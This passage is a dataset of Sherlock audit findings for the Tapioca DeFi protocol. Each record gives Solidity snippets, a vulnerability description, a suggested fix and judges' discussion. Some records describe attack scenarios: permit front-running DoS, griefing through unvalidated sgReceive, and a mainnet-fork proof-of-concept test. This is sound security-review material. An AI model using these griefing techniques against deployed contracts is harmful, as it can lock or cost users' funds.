(_send.minAmountLD > amountToSend) {\n                    _send.minAmountLD = amountToSend;\n                }\n```\n\nThe issue here is that, the computed amount to send, is never updated in the `lsSendParams.sendParam`, the current code still goes on to send the packet to the destination chain with the default input amount:\n```\n            if (msg_.withdrawOnOtherChain) {\n                /// @dev determine the right amount to send back to source\n                uint256 amountToSend = _send.amountLD > _options.tapAmount ? _options.tapAmount : _send.amountLD;\n                if (_send.minAmountLD > amountToSend) {\n                    _send.minAmountLD = amountToSend;\n                }\n\n\n                // Sends to source and preserve source `msg.sender` (`from` in this case).\n                _sendPacket(msg_.lzSendParams, msg_.composeMsg, _options.from);\n\n\n                // Refund extra amounts\n                if (_options.tapAmount - amountToSend > 0) {\n                    IERC20(tapOft).safeTransfer(_options.from, _options.tapAmount - amountToSend);\n                }\n```\n\nTo Illustrate:\nassuming send `amountLD` = 100 and the user is to receive a tap amount of = 80 since `amountLD` is greater than tap amount, the amount to send should be 80, i.e. `msg_.lzSendParams.sendParam.amountLD` = 80 The current code goes on to send the default 100 to the user, when the user is only entitled to 80ч
Underflow Vulnerability in `Market::_allowedBorrow` Function: Oversight with Pearlmit Allowance Handlingчmediumч"```\n    function _allowedBorrow(address from, uint256 share) internal virtual override {\n        if (from != msg.sender) {\n            // TODO review risk of using this\n            (uint256 pearlmitAllowed,) = penrose.pearlmit().allowance(from, msg.sender, address(yieldBox), collateralId);\n            require(allowanceBorrow[from][msg.sender] >= share || pearlmitAllowed >= share, ""Market: not approved"");\n            if (allowanceBorrow[from][msg.sender] != type(uint256).max) {\n                allowanceBorrow[from][msg.sender] -= share;\n            }\n        }\n    }\n```\n"ч"The protocol permits users to authorize spenders using the MarketERC20::approveBorrow function, and also includes support for allowances granted through the `Pearlmit` contract. However, an oversight in the _allowedBorrow function leads to an underflow issue when spenders utilize `Pearlmit` allowances, rendering them unable to execute borrowing actions despite having the necessary permission.\nProtocol users can approve a spender via MarketERC20::approveBorrow function, to perform certain actions like `borrow`, `repay` or adding of collateral on their behalf. Whenever the spender calls any of these functionalities, down the execution _allowedBorrow is invoked to check if the caller is allowed to `borrow` `share` `from` `from`, and then decrease the spender's allowance by the `share` amount.\n```\n    function _allowedBorrow(address from, uint256 share) internal virtual override {\n        if (from != msg.sender) {\n            // TODO review risk of using this\n            (uint256 pearlmitAllowed,) = penrose.pearlmit().allowance(from, msg.sender, address(yieldBox), collateralId);\n            require(allowanceBorrow[from][msg.sender] >= share || pearlmitAllowed >= share, ""Market: not approved"");\n            if (allowanceBorrow[from][msg.sender] != type(uint256).max) {\n                allowanceBorrow[from][msg.sender] -= share;\n            }\n        }\n    }\n```\n\nThe problem here is, _allowedBorrow will always revert due to an underflow whenever the spender is given an allowance in the `Pearlmit` contract.\nTo Illustrate\nAssuming we have two users, Bob and Alice, since `Pearlmit` allowance is also accepted, Alice grants Bob a borrowing allowance of `100` tokens for the collateral id using `Pearlmit`. Note that Bob's allowance in the Market contract for Alice will be `zero(0)` and `100` in `Pearlmit`.\nWhen Bob tries to borrow an amount equal to his `Pearlmit` allowance, down the borrow logic `_allowedBorrow` is called, in `_allowedBorrow` function, the below requirement passes, since the returned `pearlmitAllowed` for Bob will equal `100` shares\n```\n require(allowanceBorrow[from][msg.sender] >= share || pearlmitAllowed >= share, ""Market: not approved"");\n```\n\nRemember Bob's allowance in the Market contract for Alice is `0`, but `100` in `Pearlmit`, but _allowedBorrow function erroneously attempts to deduct the share from Bob's Market allowance, which will thus result in an underflow revert(0 - 100).\n```\n            if (allowanceBorrow[from][msg.sender] != type(uint256).max) {\n                allowanceBorrow[from][msg.sender] -= share;\n            }\n```\n"ч"After ensuring that the user has got the approval, return when permission from `Pearlmit` is used:\n```\n    function _allowedBorrow(address from, uint256 share) internal virtual override {\n        if (from != msg.sender) {\n            // TODO review risk of using this\n            (uint256 pearlmitAllowed,) = penrose.pearlmit().allowance(from, msg.sender, address(yieldBox), collateralId);\n            require(allowanceBorrow[from][msg.sender] >= share || pearlmitAllowed >= share, ""Market: not approved"");\n+            if (pearlmitAllowed != 0) return;\n            if (allowanceBorrow[from][msg.sender] != type(uint256).max) {\n                allowanceBorrow[from][msg.sender] -= share;\n            }\n        }\n    }\n```\n\nOr remove support for `Pearlmit` allowance\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nthis seem valid, the pearlmit allowance should be deducted instead of the market one; medium(7)\ncryptotechmaker\nFixed in https://github.com/Tapioca-DAO/Tapioca-bar/pull/349\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/349."чAlthough giving a spender allowance via `Pearlmit` will appear to be supported, the spender cannot carry out any borrowing action in the Market.\nCode Snippet\nTool used\nManual Review
mTOFTReceiver MSG_XCHAIN_LEND_XCHAIN_LOCK unable to executeчmediumч```\n    function _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {\n        // Decode OFT compose message.\n        (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =\n            TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);\n\n        // Call Permits/approvals if the msg type is a permit/approval.\n        // If the msg type is not a permit/approval, it will call the other receivers.\n        if (msgType_ == MSG_REMOTE_TRANSFER) {\n            _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);\n        } else if (!_extExec(msgType_, tapComposeMsg_)) {\n            // Check if the TOE extender is set and the msg type is valid. If so, call the TOE extender to handle msg.\n            if (\n                address(tapiocaOmnichainReceiveExtender) != address(0)\n                    && tapiocaOmnichainReceiveExtender.isMsgTypeValid(msgType_)\n            ) {\n                bytes memory callData = abi.encodeWithSelector(\n                    ITapiocaOmnichainReceiveExtender.toeComposeReceiver.selector,\n                    msgType_,\n                    srcChainSender_,\n                    tapComposeMsg_\n                );\n                (bool success, bytes memory returnData) =\n                    address(tapiocaOmnichainReceiveExtender).delegatecall(callData);\n                if (!success) {\n                    revert(_getTOEExtenderRevertMsg(returnData));\n                }\n            } else {\n                // If no TOE extender is set or msg type doesn't match extender, try to call the internal receiver.\n                if (!_toeComposeReceiver(msgType_, srcChainSender_, tapComposeMsg_)) {\n                  revert InvalidMsgType(msgType_);\n                }\n            }\n        }\n```\nчIn `mTOFTReceiver._toftCustomComposeReceiver(uint16 _msgType)` If `_msgType` is processed normally, the method must return `true`, if it returns `false`, it will trigger `revert InvalidMsgType()` But when `_msgType` == MSG_XCHAIN_LEND_XCHAIN_LOCK is executed normally, it does not correctly return `true` This causes this type of execution to always fail\nThe main execution order of `_lzCompose()` is as follows:\nIf msgType_ == MSG_REMOTE_TRANSFER, execute `_remoteTransferReceiver()`\nOtherwise, execute `_extExec(msgType_, tapComposeMsg_)`\nOtherwise, execute `tapiocaOmnichainReceiveExtender`\nOtherwise, execute `_toeComposeReceiver()`\nIf the 4th step `_toeComposeReceiver()` returns false, it is considered that the type cannot be found, and `revert InvalidMsgType(msgType_);` is triggered\nthe code as follows：\n```\n    function _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {\n        // Decode OFT compose message.\n        (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =\n            TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);\n\n        // Call Permits/approvals if the msg type is a permit/approval.\n        // If the msg type is not a permit/approval, it will call the other receivers.\n        if (msgType_ == MSG_REMOTE_TRANSFER) {\n            _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);\n        } else if (!_extExec(msgType_, tapComposeMsg_)) {\n            // Check if the TOE extender is set and the msg type is valid. If so, call the TOE extender to handle msg.\n            if (\n                address(tapiocaOmnichainReceiveExtender) != address(0)\n                    && tapiocaOmnichainReceiveExtender.isMsgTypeValid(msgType_)\n            ) {\n                bytes memory callData = abi.encodeWithSelector(\n                    ITapiocaOmnichainReceiveExtender.toeComposeReceiver.selector,\n                    msgType_,\n                    srcChainSender_,\n                    tapComposeMsg_\n                );\n                (bool success, bytes memory returnData) =\n                    address(tapiocaOmnichainReceiveExtender).delegatecall(callData);\n                if (!success) {\n                    revert(_getTOEExtenderRevertMsg(returnData));\n                }\n            } else {\n                // If no TOE extender is set or msg type doesn't match extender, try to call the internal receiver.\n                if (!_toeComposeReceiver(msgType_, srcChainSender_, tapComposeMsg_)) {\n                  revert InvalidMsgType(msgType_);\n                }\n            }\n        }\n```\n\nThe implementation of `mTOFTReceiver._toeComposeReceiver()` is as follows:\n```\ncontract mTOFTReceiver is BaseTOFTReceiver {\n    constructor(TOFTInitStruct memory _data) BaseTOFTReceiver(_data) {}\n\n    function _toftCustomComposeReceiver(uint16 _msgType, address, bytes memory _toeComposeMsg)\n        internal\n        override\n        returns (bool success)\n    {\n        if (_msgType == MSG_LEVERAGE_UP) { //@check\n            _executeModule(\n                uint8(ITOFT.Module.TOFTMarketReceiver),\n                abi.encodeWithSelector(TOFTMarketReceiverModule.leverageUpReceiver.selector, _toeComposeMsg),\n                false\n            );\n            return true;\n        } else if (_msgType == MSG_XCHAIN_LEND_XCHAIN_LOCK) { //@check\n            _executeModule(\n                uint8(ITOFT.Module.TOFTOptionsReceiver),\n                abi.encodeWithSelector(\n                    TOFTOptionsReceiverModule.mintLendXChainSGLXChainLockAndParticipateReceiver.selector, _toeComposeMsg\n                ),\n                false\n            );\n      //@audit miss return true\n        } else {\n            return false;\n        }\n    }\n}\n```\n\nAs mentioned above, because `_msgType == MSG_XCHAIN_LEND_XCHAIN_LOCK` does not return `true`, it always triggers `revert InvalidMsgType(msgType_);`ч
Multiple contracts cannot be pausedчmediumч```\n    function executeModule(ITOFT.Module _module, bytes memory _data, bool _forwardRevert)\n        external\n        payable\n      whenNotPaused\n        returns (bytes memory returnData)\n    {\n// rest of code\n    function sendPacket(LZSendParam calldata _lzSendParam, bytes calldata _composeMsg)\n        public\n        payable\n      whenNotPaused\n        returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt)\n    {\n```\nчFor safety, tapioca has added `whenNotPaused` restrictions to multiple contracts But there is no method provided to modify the `_paused` state If a security event occurs, it cannot be paused at all\n```\n    function executeModule(ITOFT.Module _module, bytes memory _data, bool _forwardRevert)\n        external\n        payable\n      whenNotPaused\n        returns (bytes memory returnData)\n    {\n// rest of code\n    function sendPacket(LZSendParam calldata _lzSendParam, bytes calldata _composeMsg)\n        public\n        payable\n      whenNotPaused\n        returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt)\n    {\n```\n\nIn reality, there have been multiple reports of security incidents where the protocol side wants to pause to prevent losses, but cannot pause, strongly recommend adding\nNote: The following contracts cannot be paused\nmTOFT\nTOFT\nUsdo\nAssetToSGLPLeverageExecutorч```\n// Add the line below\n    function pause() external onlyOwner{\n// Add the line below\n        _pause();\n// Add the line below\n    }\n\n// Add the line below\n    function unpause() external onlyOwner{\n// Add the line below\n        _unpause();\n// Add the line below\n    }\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\nWangAudit commented:\nrefer to 24\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/TapiocaZ/commit/5cf2563fdd12787f5414690ede10681af6630eb8.чDue to the inability to modify `_paused`, it poses a security risk\nCode Snippet\nTool used\nManual Review
Composing approval with other messages is subject to DoSчmediumч```\n    function sendPacket(LZSendParam calldata _lzSendParam, bytes calldata _composeMsg)\n        public\n        payable\n        whenNotPaused // @audit Pausing is not implemented yet.\n        returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt)\n    {\n        (msgReceipt, oftReceipt) = abi.decode(\n            _executeModule(\n                uint8(ITOFT.Module.TOFTSender),\n               abi.encodeCall(TapiocaOmnichainSender.sendPacket, (_lzSendParam, _composeMsg)),\n                false\n            ),\n            (MessagingReceipt, OFTReceipt)\n        );\n    }\n```\nч`TOFT::sendPacket` function allows the caller to specify multiple messages that are executed on the destination chain. On the receiving side the `lzCompose` function in `TOFT` contract can be DoS-ed by front-running the approval message and causing the `lzCompose` to revert. As `lzCompose` is supposed to process several messages, this results in lost fee paid on the sending chain for executing the subsequent messages and any value or gas airdropped to the contract.\n`TOFT::sendPacket` allows the caller to specify arbitrary `_composeMsg`. It can be a single message or multiple composed messages.\n```\n    function sendPacket(LZSendParam calldata _lzSendParam, bytes calldata _composeMsg)\n        public\n        payable\n        whenNotPaused // @audit Pausing is not implemented yet.\n        returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt)\n    {\n        (msgReceipt, oftReceipt) = abi.decode(\n            _executeModule(\n                uint8(ITOFT.Module.TOFTSender),\n               abi.encodeCall(TapiocaOmnichainSender.sendPacket, (_lzSendParam, _composeMsg)),\n                false\n            ),\n            (MessagingReceipt, OFTReceipt)\n        );\n    }\n```\n\nIf we observe the logic inside the lzCompose:\n```\n    function _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {\n        // Decode OFT compose message.\n        (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =\n            TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);\n\n        // Call Permits/approvals if the msg type is a permit/approval.\n        // If the msg type is not a permit/approval, it will call the other receivers.\n        if (msgType_ == MSG_REMOTE_TRANSFER) {\n            _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);\n        } else if (!_extExec(msgType_, tapComposeMsg_)) {\n            // Check if the TOE extender is set and the msg type is valid. If so, call the TOE extender to handle msg.\n            if (\n                address(tapiocaOmnichainReceiveExtender) != address(0)\n                    && tapiocaOmnichainReceiveExtender.isMsgTypeValid(msgType_)\n            ) {\n                bytes memory callData = abi.encodeWithSelector(\n                    ITapiocaOmnichainReceiveExtender.toeComposeReceiver.selector,\n                    msgType_,\n                    srcChainSender_,\n                    tapComposeMsg_\n                );\n                (bool success, bytes memory returnData) =\n                    address(tapiocaOmnichainReceiveExtender).delegatecall(callData);\n                if (!success) {\n                    revert(_getTOEExtenderRevertMsg(returnData));\n                }\n            } else {\n                // If no TOE extender is set or msg type doesn't match extender, try to call the internal receiver.\n                if (!_toeComposeReceiver(msgType_, srcChainSender_, tapComposeMsg_)) {\n                    revert InvalidMsgType(msgType_);\n                }\n            }\n        }\n\n        emit ComposeReceived(msgType_, _guid, tapComposeMsg_);\n        if (nextMsg_.length > 0) {\n            _lzCompose(address(this), _guid, nextMsg_);\n        }\n    }\n```\n\nAt the beginning of the function bytes memory `tapComposeMsg_` is the message being processed, while `bytes memory nextMsg_` are all the other messages. `lzCompose` will process all the messages until `nextMsg_` is empty.\nA user might want to have his first message to grant approval, e.g. `_extExec` function call, while his second message might execute `BaseTOFTReceiver::_toeComposeReceiver` with `_msgType == MSG_YB_SEND_SGL_BORROW`.\nThis is a problem as there is a clear DoS attack vector on granting any approvals. A griever can observe the permit message from the user and front-run the `lzCompose` call and submit the approval on the user's behalf.\nAs permits use nonce it can't be replayed, which means if anyone front-runs the permit, the original permit will revert. This means that `lzCompose` always reverts and all the gas and value to process the `BaseTOFTReceiver::_toeComposeReceiver` with `_msgType == MSG_YB_SEND_SGL_BORROW` is lost for the user.\nPermit based DoS attack is described in detail in the following article by Trust-Security: https://www.trust-security.xyz/post/permission-denied.ч`TOFT::sendPacket` should do extra checks to ensure if the message contains approvals, it should not allow packing several messages.чWhen user is granting approvals and wants to execute any other message in the same `lzCompose` call, the attacker can deny the user from executing the other message by front-running the approval message and causing the `lzCompose` to revert. The impact is lost fee paid on the sending chain for executing the subsequent messages and any value or gas airdropped to the contract. This is especially severe when the user wants to withdraw funds to another chain, as he needs to pay for that fee on the sending chain.\nCode Snippet\nTool used\nManual Review
StargateRouter cannot send payloads and rebalancing of ERC20s is brokenчmediumч"```\nfunction testStargateRouterReverting() public {\n    vm.createSelectFork(vm.envString(""MAINNET_RPC_URL""));\n    \n    address stargateRouter = 0x8731d54E9D02c286767d56ac03e8037C07e01e98;\n    address DAIWhale = 0x7A8EDc710dDEAdDDB0B539DE83F3a306A621E823;\n    address DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    IStargateRouter.lzTxObj memory lzTxParams = IStargateRouter.lzTxObj(0, 0, ""0x00"");\n\n    vm.startPrank(DAIWhale);\n    vm.deal(DAIWhale, 5 ether);\n    IERC20(DAI).approve(stargateRouter, 1e18);\n    IStargateRouter(stargateRouter).swap{value: 1 ether}(\n        111, 3, 3, payable(address(this)), 1e18, 1, lzTxParams, abi.encode(address(this)), ""0x""\n    );\n}\n```\n"ч"If we take a look at the code, there is a payload equal to ""0x"" being sent with the transaction:\nAs a proof of concept we can try to send a payload through the stargate router on a forked network and see that the transaction will revert. p.s. make sure to run on it on a forked network on Ethereum mainnet.\n```\nfunction testStargateRouterReverting() public {\n    vm.createSelectFork(vm.envString(""MAINNET_RPC_URL""));\n    \n    address stargateRouter = 0x8731d54E9D02c286767d56ac03e8037C07e01e98;\n    address DAIWhale = 0x7A8EDc710dDEAdDDB0B539DE83F3a306A621E823;\n    address DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    IStargateRouter.lzTxObj memory lzTxParams = IStargateRouter.lzTxObj(0, 0, ""0x00"");\n\n    vm.startPrank(DAIWhale);\n    vm.deal(DAIWhale, 5 ether);\n    IERC20(DAI).approve(stargateRouter, 1e18);\n    IStargateRouter(stargateRouter).swap{value: 1 ether}(\n        111, 3, 3, payable(address(this)), 1e18, 1, lzTxParams, abi.encode(address(this)), ""0x""\n    );\n}\n```\n\nIt fails with the following error:\nBy looking at the Stargate documentation we can see that it is highlighted to use the `StargateComposer` instead of the `StargateRouter` if sending payloads: https://stargateprotocol.gitbook.io/stargate/stargate-composability.\nStargateComposer does not have the `retryRevert` function. Its code be found here: https://www.codeslaw.app/contracts/ethereum/0xeCc19E177d24551aA7ed6Bc6FE566eCa726CC8a9.\nAs this makes the rebalancing of `mTOFTs` broken, I'm marking this as a high-severity issue."чUse the `StargateComposer` instead of the `StargateRouter` if sending payloads.\nDiscussion\ncryptotechmaker\nInvalid; Duplicate of https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/69\nwindhustler\nnevillehuang\n@0xRektora @cryptotechmaker Might want to take a look, but seems like the same underlying root cause related to configuration of stargaterouter. I checked the composer contract and I believe @windhustler is right. I am also inclined to think they are not duplicates. Let me know if I am missing something.\ncryptotechmaker\n@nevillehuang It's duplicate in the sense that #69 mentioned an issue that's being fixed by using StargateComposer, which is the same solution for this one\nPlease lmk if otherwise\nnevillehuang\nHi @cryptotechmaker consulted tapioca's internal judge @cvetanovv and agree although fixes are similar, different funcitonalities are impacted and so it can be seen as two separate fixes combined into one, so will be separating this from #69\ncryptotechmaker\n@nevillehuang Sure! However, there's not going to be any PR for the issue as we plan to use StargateComposerчRebalancing of `mTOFTs` across chains is broken and as it is one of the main functionalities of the protocol, this is a high-severity issue.\nCode Snippet\nTool used\nManual Review
Gas parameters for Stargate swap are hardcoded leading to stuck messagesчmediumч```\n    function swap(\n        uint16 _chainId,\n        uint256 _srcPoolId,\n        uint256 _dstPoolId,\n        address payable _refundAddress,\n        Pool.CreditObj memory _c,\n        Pool.SwapObj memory _s,\n        IStargateRouter.lzTxObj memory _lzTxParams, \n        bytes calldata _to,\n        bytes calldata _payload\n    ) external payable onlyRouter {\n        bytes memory payload = abi.encode(TYPE_SWAP_REMOTE, _srcPoolId, _dstPoolId, _lzTxParams.dstGasForCall, _c, _s, _to, _payload);\n        _call(_chainId, TYPE_SWAP_REMOTE, _refundAddress, _lzTxParams, payload);\n    }\n\n    function _call(\n        uint16 _chainId,\n        uint8 _type,\n        address payable _refundAddress,\n        IStargateRouter.lzTxObj memory _lzTxParams,\n        bytes memory _payload\n    ) internal {\n        bytes memory lzTxParamBuilt = _txParamBuilder(_chainId, _type, _lzTxParams);\n        uint64 nextNonce = layerZeroEndpoint.getOutboundNonce(_chainId, address(this)) + 1;\n        layerZeroEndpoint.send{value: msg.value}(_chainId, bridgeLookup[_chainId], _payload, _refundAddress, address(this), lzTxParamBuilt);\n        emit SendMsg(_type, nextNonce);\n    }\n```\nч"The `dstGasForCall` for transferring erc20s through Stargate is hardcoded to 0 in the `Balancer` contract leading to `sgReceive` not being called during Stargate swap. As a consequence, the `sgReceive` has to be manually called to clear the `cachedSwapLookup` mapping, but this can be DoSed due to the fact that the `mTOFT::sgReceive` doesn't validate any of its parameters. This can be exploited to perform a long-term DoS attack.\nGas parameters for Stargate\nStargate Swap allows the caller to specify the:\n`dstGasForCall` which is the gas amount forwarded while calling the `sgReceive` on the destination contract.\n`dstNativeAmount` and `dstNativeAddr` which is the amount and address where the native token is sent to.\n```\n    function swap(\n        uint16 _chainId,\n        uint256 _srcPoolId,\n        uint256 _dstPoolId,\n        address payable _refundAddress,\n        Pool.CreditObj memory _c,\n        Pool.SwapObj memory _s,\n        IStargateRouter.lzTxObj memory _lzTxParams, \n        bytes calldata _to,\n        bytes calldata _payload\n    ) external payable onlyRouter {\n        bytes memory payload = abi.encode(TYPE_SWAP_REMOTE, _srcPoolId, _dstPoolId, _lzTxParams.dstGasForCall, _c, _s, _to, _payload);\n        _call(_chainId, TYPE_SWAP_REMOTE, _refundAddress, _lzTxParams, payload);\n    }\n\n    function _call(\n        uint16 _chainId,\n        uint8 _type,\n        address payable _refundAddress,\n        IStargateRouter.lzTxObj memory _lzTxParams,\n        bytes memory _payload\n    ) internal {\n        bytes memory lzTxParamBuilt = _txParamBuilder(_chainId, _type, _lzTxParams);\n        uint64 nextNonce = layerZeroEndpoint.getOutboundNonce(_chainId, address(this)) + 1;\n        layerZeroEndpoint.send{value: msg.value}(_chainId, bridgeLookup[_chainId], _payload, _refundAddress, address(this), lzTxParamBuilt);\n        emit SendMsg(_type, nextNonce);\n    }\n```\n\nIt gets encoded inside the payload that is sent through the LayerZero message. The payload gets decoded inside the `Bridge::lzReceive` on destination chain. And `dstGasForCall` is forwarded to the `sgReceive` function:\n```\n    function clearCachedSwap(\n        uint16 _srcChainId,\n        bytes calldata _srcAddress,\n        uint256 _nonce\n    ) external {\n        CachedSwap memory cs = cachedSwapLookup[_srcChainId][_srcAddress][_nonce];\n        require(cs.to != address(0x0), ""Stargate: cache already cleared"");\n        // clear the data\n        cachedSwapLookup[_srcChainId][_srcAddress][_nonce] = CachedSwap(address(0x0), 0, address(0x0), """");\n        IStargateReceiver(cs.to).sgReceive(_srcChainId, _srcAddress, _nonce, cs.token, cs.amountLD, cs.payload);\n    }\n```\n\nAlthough not the intended behavior there seems to be no issue with erc20 token sitting on the `mTOFT` contract for a shorter period of time.\nsgReceive\nThis leads to the second issue. The `sgReceive` function interface specifies the `chainId`, `srcAddress`, and `token`.\n`chainId` is the layerZero `chainId` of the source chain. In their docs referred to endpointId: https://layerzero.gitbook.io/docs/technical-reference/mainnet/supported-chain-ids\n`srcAddress` is the address of the source sending contract\n`token` is the address of the `token` that was sent to the destination contract.\nIn the current implementation, the `sgReceive` function doesn't check any of these parameters. In practice this means that anyone can specify the `mTOFT` address as the receiver and initiate Stargate Swap from any chain to the `mTOFT` contract.\nIn conjunction with the first issue, this opens up the possibility of a DoS attack.\nLet's imagine the following scenario:\nRebalancing operation needs to be performed between `mTOFT` on Ethereum and Avalanche that hold `USDC` as the underlying token.\nRebalancing is initiated from Ethereum but the `sgReceive` on Avalanche fails and 1000 USDCs are sitting on `mTOFT` contract on Avalanche.\nA griever noticed this and initiated Stargate swap from Ethereum to Avalanche for 1 `USDT` specifying the `mTOFT` contract as the receiver.\nThis is successful and now `mTOFT` has 1 `USDT` but 999 `USDC` as the griever's transaction has called the `sgRecieve` function that pushed 1 `USDC` to the `TOFTVault`.\nAs a consequence, the `clearCachedSwap` function fails because it tries to transfer the original 1000 `USDC`.\n```\n    function sgReceive(uint16, bytes memory, uint256, address, uint256 amountLD, bytes memory) external payable {\n        if (msg.sender != _stargateRouter) revert mTOFT_NotAuthorized();\n\n        if (erc20 == address(0)) {\n            vault.depositNative{value: amountLD}();\n        } else {\n>            IERC20(erc20).safeTransfer(address(vault), amountLD); // amountLD is the original 1000 USDC\n        }\n    }\n```\n\nThe only solution here is to manually transfer that 1 USDC to the `mTOFT` contract and try calling the `clearCachedSwap` again.\nThe griever can repeat this process multiple times."ч"
Balancer using safeApprove may lead to revert.чmediumч"```\n    function _routerSwap(\n        uint16 _dstChainId,\n        uint256 _srcPoolId,\n        uint256 _dstPoolId,\n        uint256 _amount,\n        uint256 _slippage,\n        address payable _oft,\n        address _erc20\n    ) private {\n        bytes memory _dst = abi.encodePacked(connectedOFTs[_oft][_dstChainId].dstOft);\n      IERC20(_erc20).safeApprove(address(router), _amount);\n        router.swap{value: msg.value}(\n            _dstChainId,\n            _srcPoolId,\n            _dstPoolId,\n            payable(this),\n            _amount,\n            _computeMinAmount(_amount, _slippage),\n            IStargateRouterBase.lzTxObj({dstGasForCall: 0, dstNativeAmount: 0, dstNativeAddr: ""0x0""}),\n            _dst,\n            ""0x""\n        );\n    }\n```\n"ч"When executing `Balancer._routerSwap()`, the `oz` `safeApprove` function is used to set an allowance. Due to the presence of the `convertRate` in the `router`, `Balancer._routerSwap()` rounds down the incoming quantity. This behavior may result in the allowance not being fully use, causing a subsequent execution of `oz.safeApprove()` to revert.\nThe code snippet for `Balancer._routerSwap()` is as follows:\n```\n    function _routerSwap(\n        uint16 _dstChainId,\n        uint256 _srcPoolId,\n        uint256 _dstPoolId,\n        uint256 _amount,\n        uint256 _slippage,\n        address payable _oft,\n        address _erc20\n    ) private {\n        bytes memory _dst = abi.encodePacked(connectedOFTs[_oft][_dstChainId].dstOft);\n      IERC20(_erc20).safeApprove(address(router), _amount);\n        router.swap{value: msg.value}(\n            _dstChainId,\n            _srcPoolId,\n            _dstPoolId,\n            payable(this),\n            _amount,\n            _computeMinAmount(_amount, _slippage),\n            IStargateRouterBase.lzTxObj({dstGasForCall: 0, dstNativeAmount: 0, dstNativeAddr: ""0x0""}),\n            _dst,\n            ""0x""\n        );\n    }\n```\n\nIn the above code, `SafeERC20.safeApprove()` from the `oz` library is used, but the allowance is not cleared afterward. Consequently, if the current allowance is not fully use during this transaction, a subsequent execution of `SafeERC20.safeApprove()` will revert.\nIs it guaranteed that `router.swap()` will fully use the allowance? Not necessarily. Due to the presence of `convertRate` in the implementation code, the `router` rounds down the amount, potentially leaving a remainder in the allowance. DAI pool `convertRate` = 1e12 DAI pool: https://etherscan.io/address/0x0Faf1d2d3CED330824de3B8200fc8dc6E397850d#readContract\nrouter codes: https://etherscan.io/address/0x8731d54E9D02c286767d56ac03e8037C07e01e98#code\n```\n    function swap(\n        uint16 _dstChainId,\n        uint256 _srcPoolId,\n        uint256 _dstPoolId,\n        address payable _refundAddress,\n        uint256 _amountLD,\n        uint256 _minAmountLD,\n        lzTxObj memory _lzTxParams,\n        bytes calldata _to,\n        bytes calldata _payload\n    ) external payable override nonReentrant {\n        require(_amountLD > 0, ""Stargate: cannot swap 0"");\n        require(_refundAddress != address(0x0), ""Stargate: _refundAddress cannot be 0x0"");\n        Pool.SwapObj memory s;\n        Pool.CreditObj memory c;\n        {\n            Pool pool = _getPool(_srcPoolId);\n            {\n              uint256 convertRate = pool.convertRate();\n              _amountLD = _amountLD.div(convertRate).mul(convertRate);\n            }\n\n            s = pool.swap(_dstChainId, _dstPoolId, msg.sender, _amountLD, _minAmountLD, true);\n            _safeTransferFrom(pool.token(), msg.sender, address(pool), _amountLD);\n            c = pool.sendCredits(_dstChainId, _dstPoolId);\n        }\n        bridge.swap{value: msg.value}(_dstChainId, _srcPoolId, _dstPoolId, _refundAddress, c, s, _lzTxParams, _to, _payload);\n    }\n```\n"ч"
buyCollateral() does not work properlyчmediumч```\n    function buyCollateral(address from, uint256 borrowAmount, uint256 supplyAmount, bytes calldata data)\n        external\n        optionNotPaused(PauseType.LeverageBuy)\n        solvent(from, false)\n        notSelf(from)\n        returns (uint256 amountOut)\n    {\n        if (address(leverageExecutor) == address(0)) {\n            revert LeverageExecutorNotValid();\n        }\n\n        // Stack too deep fix\n        _BuyCollateralCalldata memory calldata_;\n        _BuyCollateralMemoryData memory memoryData;\n        {\n            calldata_.from = from;\n            calldata_.borrowAmount = borrowAmount;\n            calldata_.supplyAmount = supplyAmount;\n            calldata_.data = data;\n        }\n\n        {\n            uint256 supplyShare = yieldBox.toShare(assetId, calldata_.supplyAmount, true);\n            if (supplyShare > 0) {\n                (memoryData.supplyShareToAmount,) =\n                    yieldBox.withdraw(assetId, calldata_.from, address(leverageExecutor), 0, supplyShare);\n            }\n        }\n\n        {\n            (, uint256 borrowShare) = _borrow(\n                calldata_.from,\n                address(this),\n                calldata_.borrowAmount,\n                _computeVariableOpeningFee(calldata_.borrowAmount)\n            );\n            (memoryData.borrowShareToAmount,) =\n                yieldBox.withdraw(assetId, address(this), address(leverageExecutor), 0, borrowShare);\n        }\n        {\n            amountOut = leverageExecutor.getCollateral(\n                collateralId,\n                address(asset),\n                address(collateral),\n                memoryData.supplyShareToAmount + memoryData.borrowShareToAmount,\n              calldata_.from,\n                calldata_.data\n            );\n        }\n        uint256 collateralShare = yieldBox.toShare(collateralId, amountOut, false);\n      address(asset).safeApprove(address(yieldBox), type(uint256).max);\n      yieldBox.depositAsset(collateralId, address(this), address(this), 0, collateralShare); // TODO Check for rounding attack?\n      address(asset).safeApprove(address(yieldBox), 0);\n\n        if (collateralShare == 0) revert CollateralShareNotValid();\n        _allowedBorrow(calldata_.from, collateralShare);\n        _addCollateral(calldata_.from, calldata_.from, false, 0, collateralShare);\n    }\n```\nчThe `BBLeverage.buyCollateral()` function does not work as expected.\nThe implementation of `BBLeverage.buyCollateral()` is as follows:\n```\n    function buyCollateral(address from, uint256 borrowAmount, uint256 supplyAmount, bytes calldata 